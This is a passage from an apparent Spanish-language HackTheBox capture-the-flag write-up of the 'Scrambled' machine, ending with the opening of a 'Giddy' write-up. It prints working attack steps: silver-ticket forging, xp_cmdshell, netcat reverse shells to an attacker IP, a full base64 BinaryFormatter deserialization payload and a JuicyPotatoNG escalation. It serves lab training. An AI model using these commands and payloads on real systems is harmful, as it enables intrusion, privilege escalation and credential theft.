  <li>Bueno vamos a suplantar la identidad del usuario administrador para hacer esto necesitamos el <code class="language-plaintext highlighter-rouge">Domain SID</code> del dominio para generar un <code class="language-plaintext highlighter-rouge">TGS</code> bajo el usuario administrador <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getPac scrm.local/ksimpson:ksimpson <span class="nt">-targetUser</span> Administrator | <span class="nb">grep </span>Domain
LogonDomainName:                 <span class="s1">'SCRM'</span>
LogonDomainId:
ResourceGroupDomainSid:
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
</code></pre></div></div>

<ul>
  <li>Ahora necesitamos el hash <code class="language-plaintext highlighter-rouge">NT</code> para eso como tenemos la contraseña tenemos que convertirlo <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b999a16500b87d17ec7f2e2a68778f05
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">ticketer</code> con el <code class="language-plaintext highlighter-rouge">SPN</code> que tenemos, el <code class="language-plaintext highlighter-rouge">hash</code> y el <code class="language-plaintext highlighter-rouge">Domain SID.</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-ticketer <span class="nt">-spn</span> MSSQLSvc/dc1.scrm.local <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-domain</span> scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>scrm.local/Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_LOGON_INFO
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_CLIENT_INFO_TYPE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_SERVER_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_PRIVSVR_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora exportamos la variable.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno somos <code class="language-plaintext highlighter-rouge">administrator</code> a si que vamos habilitador <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y asi poder ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output
<span class="nt">-----------</span>
scrm<span class="se">\s</span>qlsvc

NULL

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subir el nc.exe a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"curl 10.10.14.2/nc.exe -o C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span>
output                                                                  
<span class="nt">--------------------------------------------------------------------------------</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--100 28160  100 28160    0     0  85836      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 86116

NULL                                                                    
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe -e cmd 10.10.14.2 443"</span>
</code></pre></div></div>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 55826
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\s</span>qlsvc

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="shell-as-miscsvc">Shell as miscsvc</h2>

<ul>
  <li>Vemos otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\U</span>sers

05/11/2021  15:56    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  15:56    &lt;DIR&gt;          ..
05/11/2021  22:28    &lt;DIR&gt;          administrator
03/11/2021  20:31    &lt;DIR&gt;          miscsvc
26/01/2020  18:54    &lt;DIR&gt;          Public
01/06/2022  14:58    &lt;DIR&gt;          sqlsvc
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  16,013,860,864 bytes free
</code></pre></div></div>

<ul>
  <li>Vemos una vía no intencionada <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;whoami /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacerlo por la vía intencionada si no ya seria explotar eso y listo.</p>
  </li>
  <li>
    <p>Vamos a enumerar el servicio <code class="language-plaintext highlighter-rouge">sql</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> SELECT name FROM master.sys.databases<span class="p">;</span>
name
<span class="nt">----------</span>
master

tempdb

model

msdb

ScrambleHR

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tablas de <code class="language-plaintext highlighter-rouge">ScrambleHR</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select </span>table_name from ScrambleHR.information_schema.tables<span class="p">;</span>
table_name
<span class="nt">----------</span>
Employees

UserImport

Timesheets

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select</span> <span class="k">*</span> from ScrambleHR.dbo.UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups
<span class="nt">--------</span>   <span class="nt">-----------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>
MiscSvc    ScrambledEggs9900   scrm.local                90               0
</code></pre></div></div>

<ul>
  <li>Podemos usar Powershell para definir la credencial.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
<span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
scrm<span class="se">\m</span>iscsvc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> C:<span class="se">\T</span>emp<span class="se">\n</span>etcat.exe <span class="nt">-e</span> cmd 10.10.14.3 443 <span class="o">}</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61231
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\m</span>iscsvc

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
99e0ac7dcbc5c354ac0169f07630794d

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos estos archivos interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client

05/11/2021  21:57    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  21:57    &lt;DIR&gt;          ..
05/11/2021  21:52            86,528 ScrambleClient.exe
05/11/2021  21:52            19,456 ScrambleLib.dll
               2 File<span class="o">(</span>s<span class="o">)</span>        105,984 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  16,009,113,600 bytes free

C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlo mediante <code class="language-plaintext highlighter-rouge">smbclient.py</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use IT</span>
<span class="c"># cd Apps\Sales Order Client</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 <span class="nb">.</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 ..
<span class="nt">-rw-rw-rw-</span>      86528  Fri Nov  5 14:57:08 2021 ScrambleClient.exe
<span class="nt">-rw-rw-rw-</span>      19456  Fri Nov  5 14:57:08 2021 ScrambleLib.dll
<span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleClient.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleLib.dll
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlos a una maquina <code class="language-plaintext highlighter-rouge">Windows</code> para con <code class="language-plaintext highlighter-rouge">Dnspy</code> observar el código.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe.png" />
</p>

<ul>
  <li>Si le damos en edit. vemos que esta corriendo en el puerto 4411.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe2.png" />
</p>

<ul>
  <li>Al parecer parece un software de ordenes en la empresa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos analizar el código para ver que es lo que pasa por detrás.</p>
  </li>
  <li>
    <p>Y bueno ya vemos que emplea <code class="language-plaintext highlighter-rouge">Serialize</code> básicamente serializa la data y podemos modificar el input con un ataque de deserialización con base64.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial.png" />
</p>

<ul>
  <li>Como dato extra si observamos en la parte del login si el usuario es scrmdev podemos entrar y al parecer aplica un Bypass vamos a entrar con ese usuario sin proporcionar contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial2.png" />
</p>

<ul>
  <li>Lo que vamos hacer para ganar acceso es conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> y cuando eso pase enviar una data serializada pero necesitamos general un <code class="language-plaintext highlighter-rouge">payload</code> <a href="https://github.com/pwntester/ysoserial.net/releases">https://github.com/pwntester/ysoserial.net/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/yserial.png" />
</p>

<ul>
  <li>Vamos a crearlo en base64 en <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> con su gadget.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/xd.png" />
</p>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos y con <code class="language-plaintext highlighter-rouge">upload_order</code> como vimos en el código vamos a enviar nuestra data serializada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER<span class="p">;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMXdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQmpiV1FnTVRBdU1UQXVNVFF1TXlBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs<span class="o">=</span>
ERROR_GENERAL<span class="p">;</span>Error deserializing sales order: Exception has been thrown by the target of an invocation.
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Y ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61761
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5b18e5184ded3c7a33e509daf9e06b2e

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Vamos a explotar una vía no intencionada <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>       01/05/2024     02:43         153600 JuicyPotato.exe        
<span class="nt">-a----</span>       30/04/2024     23:43          28160 netcat.exe             



PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha y nos enviamos la reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; ./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
</code></pre></div></div>

<ul>
  <li>Ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61802
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span><span class="nb">hostname
hostname
</span>DC1

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Giddy (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html" rel="alternate" type="text/html" title="HackTheBox - Giddy (medium)" /><published>2024-04-26T00:00:00-06:00</published><updated>2024-04-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/cd0f72b791b481e72b7099668409a6a8.png" />
</p>

<ul>
  <li>En este post vamos a resolver la maquina Giddy de la plataforma de Hack The Box donde aprovechándonos de una SQL Injection vamos a robar el hash NTLMv2 de un usuario y nos podremos conectarnos con evil-winrm ala maquina para la escalada de privilegios vamos abusar de un servicio que al correrlo podemos arrancar un .exe para hacer lo que queramos pero tendremos que hacer varios bypass al Windows Defender para conseguirlo.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y servicios por el protocolo <strong>TCP</strong> de la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,443,3389,5985 10.129.96.140 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-26 12:49 CST
Nmap scan report <span class="k">for </span>10.129.96.140
Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
